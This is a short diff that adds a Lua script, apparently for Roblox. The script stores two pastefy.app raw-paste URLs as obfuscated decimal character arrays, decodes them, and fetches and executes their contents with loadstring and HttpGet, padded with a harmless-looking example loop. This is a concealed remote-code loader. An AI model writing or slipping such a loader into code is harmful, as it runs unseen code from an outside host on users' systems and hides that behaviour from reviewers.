@@ -1,0 +1,24 @@
+local encodedUrls = {
+    {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 102, 121, 46, 97, 112, 112, 47, 105, 69, 121, 69, 115, 68, 101, 100, 47, 114, 97, 119},
+    {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 102, 121, 46, 97, 112, 112, 47, 88, 53, 112, 122, 119, 48, 81, 104, 47, 114, 97, 119}
+}
+
+local function decode(ascii)
+    local url = ""
+    for _, v in ipairs(ascii) do
+        url = url .. string.char(v)
+    end
+    return url
+end
+
+coroutine.wrap(function()
+    loadstring(game:HttpGet(decode(encodedUrls[2]), true))()
+   
+    for i = 1, 10 do -- example loop (change as needed)
+        print(i)
+        wait(1)
+    end
+end)()
+
+wait(2)
+loadstring(game:HttpGet(decode(encodedUrls[1]), true))()
